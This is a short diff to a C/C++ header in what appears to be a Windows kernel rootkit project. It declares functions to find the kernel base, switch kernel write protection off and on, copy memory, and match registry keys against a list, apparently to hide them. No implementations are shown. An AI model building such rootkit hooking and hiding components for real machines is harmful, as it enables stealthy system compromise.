@@ -1,11 +1,7 @@
 #pragma once
-#include <ntddk.h>
-#include <aux_klib.h>
-#include <basetsd.h>
-#include <windef.h>
-#include <intrin.h>
-
-
+#include "../stdafx.h"
+#include "../Structs/Structs.h"
+#include "../RootkitHooksConfig.h"
 
 BOOLEAN GetNtoskrnl(ULONG_PTR* kernelBase, SIZE_T* kernelSize);
 
@@ -17,3 +13,11 @@ NTSTATUS SuperCopyMemory(
 KIRQL WPOFFx64();
 
 void WPONx64(KIRQL irql);
+
+NTSTATUS GetKeyName(HANDLE keyHandle, PKEY_NAME_INFORMATION* keyNameInfo);
+
+NTSTATUS CheckReqForMatchRegisterInList(HANDLE keyHandle, OUT RegistryKey& key);
+
+BOOL wstrnotnull(WSTRING str, WSTRING substr);
+
+void PrintNonullStr(PWCHAR buffer, ULONGLONG length);
